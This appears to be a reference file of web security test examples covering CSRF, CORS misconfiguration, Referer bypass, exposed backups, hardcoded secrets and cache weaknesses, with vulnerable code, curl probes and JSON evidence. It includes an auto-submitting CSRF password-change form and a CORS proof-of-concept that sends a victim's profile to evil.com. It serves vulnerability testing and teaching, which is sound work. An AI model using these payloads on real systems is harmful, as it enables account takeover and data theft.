# Access Testing Examples

This file contains comprehensive examples of cross-site attacks, session protection, and information disclosure vulnerability testing.

## Table of Contents
1. [CSRF Testing](#csrf-testing)
2. [CSRF Token Bruteforce](#csrf-token-bruteforce)
3. [CORS Misconfiguration](#cors-misconfiguration)
4. [Referer-based Bypass](#referer-based-bypass)
5. [Directory Listing](#directory-listing)
6. [Backup File Exposure](#backup-file-exposure)
7. [Hardcoded Credentials](#hardcoded-credentials)
8. [Browser Cache Weakness](#browser-cache-weakness)
9. [Browser History Weakness](#browser-history-weakness)
10. [Developer Comments](#developer-comments)
11. [Broken Links](#broken-links)
12. [Test Result Types](#test-result-types)

---

## CSRF Testing

### Example 1: Missing CSRF Token (CWE-352)

**Scenario**: Password change endpoint lacks CSRF protection

**Vulnerability**:
```python
# api/account.py - VULNERABLE
@app.route('/api/password/change', methods=['POST'])
@login_required
def change_password():
    new_password = request.json.get('new_password')
    current_user.password = hash_password(new_password)
    db.session.commit()
    return jsonify({"success": True})  # No CSRF token validation!
```

**Test (CLI)**:
```bash
# Send request without CSRF token - should fail but doesn't
curl -X POST "$TARGET/api/password/change" \
  -H "Cookie: session=victim_session_cookie" \
  -H "Content-Type: application/json" \
  -d '{"new_password":"hacked123"}'
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/password/change",
    "method": "POST",
    "csrf_token_present": false,
    "payload": "{\"new_password\":\"[REDACTED]\"}",
    "status": 200,
    "response_snippet": "{\"success\":true}"
  },
  "evidence": "CSRF vulnerability - password changed without CSRF token. Attacker can change victim's password via malicious page."
}
```

**PoC HTML**:
```html
<html>
<body>
  <form id="csrf" action="http://target.com/api/password/change" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Example 2: CSRF Token Bypass via Empty Value

**Scenario**: CSRF validation exists but accepts empty token

**Vulnerability**:
```python
# middleware/csrf.py - VULNERABLE
def validate_csrf(request):
    token = request.headers.get('X-CSRF-Token') or request.form.get('csrf_token')
    if token is not None:  # BUG: Empty string passes this check!
        return True
    return False
```

**Test (CLI)**:
```bash
# Send request with empty CSRF token
curl -X POST "$TARGET/api/transfer" \
  -H "Cookie: session=victim_session" \
  -H "X-CSRF-Token: " \
  -H "Content-Type: application/json" \
  -d '{"to_account":"attacker","amount":1000}'
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/transfer",
    "method": "POST",
    "csrf_token_value": "",
    "status": 200,
    "response_snippet": "{\"success\":true,\"transfer_id\":\"12345\"}"
  },
  "evidence": "CSRF bypass - empty token accepted. Transfer completed without valid CSRF protection."
}
```

---

## CSRF Token Bruteforce

### Example 3: Weak Token Entropy (CWE-330)

**Scenario**: CSRF tokens use predictable patterns

**Vulnerability**:
```python
# utils/csrf.py - VULNERABLE
import time

def generate_csrf_token():
    # Weak - based on timestamp (predictable!)
    return str(int(time.time()))
```

**Test (CLI)**:
```bash
# Collect multiple tokens
for i in {1..10}; do
  curl -s "$TARGET/api/csrf-token" -H "Cookie: session=test" | jq -r '.token'
  sleep 1
done

# Output (predictable timestamp pattern):
# 1702400000
# 1702400001
# 1702400002
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "tokens_collected": [
      "1702400000",
      "1702400001",
      "1702400002",
      "1702400003"
    ],
    "pattern_detected": "sequential_timestamp",
    "entropy_bits": 10
  },
  "evidence": "CSRF tokens use timestamps - fully predictable. Required entropy: 64+ bits, actual: ~10 bits."
}
```

### Example 4: Short Token Length

**Scenario**: CSRF tokens too short to be secure

**Test (CLI)**:
```bash
curl -s "$TARGET/api/csrf-token" | jq -r '.token'
# Output: "a1b2c3"  (only 6 characters!)
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "token": "a1b2c3",
    "length": 6,
    "charset": "alphanumeric",
    "entropy_bits": 31
  },
  "evidence": "CSRF token only 6 characters (36^6 combinations). Brute-forceable in minutes."
}
```

---

## CORS Misconfiguration

### Example 5: Origin Reflection (CWE-942)

**Scenario**: Server reflects any Origin header

**Vulnerability**:
```python
# middleware/cors.py - VULNERABLE
@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin  # Reflects ANY origin!
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

**Test (CLI)**:
```bash
curl -I "$TARGET/api/user/profile" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=victim_session"
```

**Response Headers**:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/user/profile",
    "method": "GET",
    "origin_sent": "https://evil.com",
    "cors_headers": {
      "Access-Control-Allow-Origin": "https://evil.com",
      "Access-Control-Allow-Credentials": "true"
    },
    "status": 200
  },
  "evidence": "CORS origin reflection with credentials - attacker can steal user data cross-origin"
}
```

**PoC HTML**:
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  fetch('https://evil.com/log?data=' + encodeURIComponent(this.responseText));
};
req.open('GET', 'http://target.com/api/user/profile', true);
req.withCredentials = true;
req.send();
</script>
```

### Example 6: Null Origin Bypass

**Scenario**: Server allows null origin for sandboxed contexts

**Test (CLI)**:
```bash
curl -I "$TARGET/api/sensitive/data" \
  -H "Origin: null" \
  -H "Cookie: session=victim_session"
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/sensitive/data",
    "origin_sent": "null",
    "cors_headers": {
      "Access-Control-Allow-Origin": "null",
      "Access-Control-Allow-Credentials": "true"
    },
    "status": 200
  },
  "evidence": "CORS null origin allowed with credentials - exploitable via sandboxed iframe or data: URL"
}
```

---

## Referer-based Bypass

### Example 7: Referer Header Spoofing (CWE-293)

**Scenario**: Admin action protected by Referer header check

**Vulnerability**:
```python
# routes/admin.py - VULNERABLE
@app.route('/admin/action', methods=['POST'])
def admin_action():
    referer = request.headers.get('Referer', '')
    if 'admin' not in referer.lower():
        abort(403)
    # Perform admin action...
    return jsonify({"success": True})
```

**Test (CLI)**:
```bash
# Without Referer - blocked
curl -X POST "$TARGET/admin/action"
# HTTP/1.1 403 Forbidden

# With spoofed Referer - bypassed
curl -X POST "$TARGET/admin/action" \
  -H "Referer: https://target.com/admin"
# HTTP/1.1 200 OK
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "baseline": {
    "url": "http://target.com/admin/action",
    "method": "POST",
    "status": 403
  },
  "test": {
    "url": "http://target.com/admin/action",
    "method": "POST",
    "headers": {"Referer": "https://target.com/admin"},
    "status": 200,
    "response_snippet": "{\"success\":true}"
  },
  "evidence": "Referer-based access control bypassed - admin action performed with spoofed Referer"
}
```

---

## Directory Listing

### Example 8: Exposed Upload Directory (CWE-548)

**Scenario**: Upload directory listing enabled

**Test (CLI)**:
```bash
curl "$TARGET/uploads/"
```

**Response**:
```html
<html>
<head><title>Index of /uploads/</title></head>
<body>
<h1>Index of /uploads/</h1>
<a href="report_2024.pdf">report_2024.pdf</a> - 2.4MB<br>
<a href="backup_db.sql">backup_db.sql</a> - 15MB<br>
<a href="users_export.csv">users_export.csv</a> - 500KB<br>
</body>
</html>
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/uploads/",
    "status": 200,
    "content_type": "text/html",
    "files_exposed": [
      "report_2024.pdf",
      "backup_db.sql",
      "users_export.csv"
    ]
  },
  "evidence": "Directory listing enabled - sensitive files exposed including database backup"
}
```

---

## Backup File Exposure

### Example 9: PHP Backup File (CWE-530)

**Scenario**: Config file backup accessible

**Test (CLI)**:
```bash
curl "$TARGET/config.php.bak"
```

**Response**:
```php
<?php
// Database configuration - BACKUP FILE
$db_host = 'localhost';
$db_user = 'root';
$db_pass = 'super_secret_password_123';
$db_name = 'production_db';

// API Keys
$api_key = 'sk_live_abcdef123456';
$stripe_secret = 'sk_test_51234567890';
?>
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/config.php.bak",
    "status": 200,
    "content_type": "text/plain",
    "credentials_found": [
      {"type": "database", "user": "root", "password": "[REDACTED]"},
      {"type": "api_key", "value": "[REDACTED]"},
      {"type": "stripe_secret", "value": "[REDACTED]"}
    ]
  },
  "evidence": "Backup file exposed - database credentials and API keys leaked"
}
```

### Example 10: Environment File Backup

**Test (CLI)**:
```bash
curl "$TARGET/.env.backup"
curl "$TARGET/.env.old"
curl "$TARGET/.env~"
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/.env.backup",
    "status": 200,
    "sensitive_vars": [
      "DATABASE_URL",
      "SECRET_KEY",
      "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY"
    ]
  },
  "evidence": "Environment backup exposed - cloud credentials and secrets leaked"
}
```

---

## Hardcoded Credentials

### Example 11: Debug Endpoint Exposing Secrets (CWE-798)

**Scenario**: Debug endpoint returns configuration including secrets

**Test (CLI)**:
```bash
curl "$TARGET/api/debug/config"
```

**Response**:
```json
{
  "database": {
    "host": "db.internal.example.com",
    "port": 5432,
    "password": "prod_db_password_123"
  },
  "api_key": "sk_live_abcdef123456",
  "jwt_secret": "super_secret_jwt_key_do_not_share",
  "debug_mode": true
}
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/debug/config",
    "status": 200,
    "authenticated": false,
    "credentials_exposed": [
      {"type": "database_password", "redacted": "[REDACTED]"},
      {"type": "api_key", "redacted": "[REDACTED]"},
      {"type": "jwt_secret", "redacted": "[REDACTED]"}
    ]
  },
  "evidence": "Unauthenticated debug endpoint exposes production credentials"
}
```

### Example 12: JavaScript Hardcoded API Key

**Test (CLI)**:
```bash
curl -s "$TARGET/static/js/app.js" | grep -iE "api_key|apikey|secret"
```

**Match**:
```javascript
const API_KEY = 'AIzaSyB1234567890abcdefghij'; // TODO: Move to env
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/static/js/app.js",
    "pattern_matched": "API_KEY = 'AIzaSyB1234567890abcdefghij'",
    "line_number": 42
  },
  "evidence": "Google API key hardcoded in JavaScript - public exposure"
}
```

---

## Browser Cache Weakness

### Example 13: Missing Cache Headers on Sensitive Endpoint (CWE-525)

**Scenario**: User profile API doesn't set cache control headers

**Test (CLI)**:
```bash
curl -I "$TARGET/api/user/profile" -H "Cookie: session=test"
```

**Response Headers**:
```
HTTP/1.1 200 OK
Content-Type: application/json
# No Cache-Control header!
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/user/profile",
    "status": 200,
    "cache_headers": {
      "Cache-Control": null,
      "Pragma": null,
      "Expires": null
    },
    "contains_sensitive_data": true
  },
  "evidence": "Sensitive endpoint missing cache headers - user data may persist in browser cache"
}
```

### Example 14: Permissive Cache Headers

**Test (CLI)**:
```bash
curl -I "$TARGET/api/account/balance" -H "Cookie: session=test"
```

**Response Headers**:
```
Cache-Control: max-age=3600
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/api/account/balance",
    "cache_headers": {
      "Cache-Control": "max-age=3600"
    }
  },
  "evidence": "Sensitive financial data cached for 1 hour - accessible from browser cache"
}
```

---

## Browser History Weakness

### Example 15: Sensitive Data in GET Parameters (CWE-525)

**Scenario**: Login form uses GET method

**Test (CLI)**:
```bash
curl -s "$TARGET/login" | grep -i "method="
```

**Found**:
```html
<form action="/login" method="GET">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/login",
    "form_method": "GET",
    "sensitive_fields": ["password"]
  },
  "evidence": "Login form uses GET - passwords will appear in browser history, server logs, and referrer headers"
}
```

### Example 16: Password Reset Token in URL

**Scenario**: Password reset sends token via GET parameter

**Observed URL**:
```
http://target.com/reset-password?token=abc123&email=user@test.com
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url_pattern": "/reset-password?token={token}&email={email}",
    "sensitive_params": ["token", "email"]
  },
  "evidence": "Password reset token in URL - exposed in browser history, referrer leakage possible"
}
```

---

## Developer Comments

### Example 17: TODO Comment Revealing Vulnerability (CWE-615)

**Test (CLI)**:
```bash
curl -s "$TARGET/" | grep -oE '<!--.*?-->'
```

**Found**:
```html
<!-- TODO: Remove admin bypass before production -->
<!-- Debug: session_id=abc123, user_id=1, role=admin -->
<!-- FIXME: SQL injection in search - use parameterized queries -->
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/",
    "comments_found": [
      "TODO: Remove admin bypass before production",
      "Debug: session_id=[REDACTED], user_id=1, role=admin",
      "FIXME: SQL injection in search"
    ]
  },
  "evidence": "Developer comments reveal security issues and debug credentials"
}
```

### Example 18: JavaScript Comment with Credentials

**Test (CLI)**:
```bash
curl -s "$TARGET/static/js/admin.js" | grep -E '//.*|/\*.*\*/'
```

**Found**:
```javascript
// Admin credentials for testing: admin / admin123
/*
  API endpoint: http://internal.api.example.com
  API Key: sk_test_1234567890
*/
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "url": "http://target.com/static/js/admin.js",
    "credentials_in_comments": [
      {"type": "admin_password", "redacted": "[REDACTED]"},
      {"type": "api_key", "redacted": "[REDACTED]"}
    ]
  },
  "evidence": "JavaScript comments contain test credentials and API keys"
}
```

---

## Broken Links

### Example 19: Broken External Link (CWE-1108)

**Scenario**: Page links to expired/unregistered domain

**Test (CLI)**:
```bash
# Extract links
curl -s "$TARGET/" | grep -oE 'href="https?://[^"]+' | cut -d'"' -f2 > links.txt

# Check each
cat links.txt | while read url; do
  status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url")
  echo "$status $url"
done
```

**Output**:
```
200 https://example.com/docs
000 https://old-cdn.expired-domain.com/script.js
404 https://partner-site.com/api/widget
```

**Evidence**:
```json
{
  "status": "VALIDATED",
  "test": {
    "source_url": "http://target.com/",
    "broken_links": [
      {
        "url": "https://old-cdn.expired-domain.com/script.js",
        "status": "DNS_FAILURE",
        "domain_available": true,
        "risk": "Script tag - attacker can register domain and inject JavaScript"
      },
      {
        "url": "https://partner-site.com/api/widget",
        "status": 404,
        "risk": "External resource unavailable"
      }
    ]
  },
  "evidence": "Broken link to expired domain in script tag - XSS via domain takeover possible"
}
```

---

## Test Result Types

### Example 20: FALSE_POSITIVE (Properly Secured)

**Scenario**: CORS properly configured with whitelist

**Test (CLI)**:
```bash
curl -I "$TARGET/api/user" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=test"
```

**Response Headers**:
```
# No Access-Control-Allow-Origin header (origin not whitelisted)
```

**Evidence**:
```json
{
  "status": "FALSE_POSITIVE",
  "test": {
    "url": "http://target.com/api/user",
    "origin_sent": "https://evil.com",
    "cors_headers": {}
  },
  "evidence": "CORS properly configured - malicious origin not reflected"
}
```

### Example 21: UNVALIDATED (Cannot Test)

**Scenario**: Endpoint requires physical 2FA token

**Evidence**:
```json
{
  "status": "UNVALIDATED",
  "reason": "Endpoint requires hardware 2FA token - cannot automate",
  "evidence": null
}
```

### Example 22: PARTIAL (Mixed Results)

**Scenario**: Some cache headers present, others missing

**Test (CLI)**:
```bash
curl -I "$TARGET/api/profile" -H "Cookie: session=test"
```

**Response Headers**:
```
Cache-Control: private
# Missing: no-store, no-cache
```

**Evidence**:
```json
{
  "status": "PARTIAL",
  "test": {
    "url": "http://target.com/api/profile",
    "cache_headers": {
      "Cache-Control": "private"
    },
    "missing_directives": ["no-store", "no-cache"]
  },
  "evidence": "Partial cache protection - 'private' set but no-store/no-cache missing. May still cache locally.",
  "requires_manual_review": true
}
```

---

## Test Account Setup

**For CSRF/CORS testing:**
```json
{
  "authenticated_user": {
    "email": "test@example.com",
    "password": "TestPass123!",
    "session_cookie": "session=abc123..."
  }
}
```

**For Referer bypass testing:**
```json
{
  "target_endpoints": [
    "/admin/action",
    "/admin/settings",
    "/api/internal/config"
  ],
  "bypass_referers": [
    "https://target.com/admin",
    "https://evil.com?target.com",
    "https://target.com.evil.com"
  ]
}
```
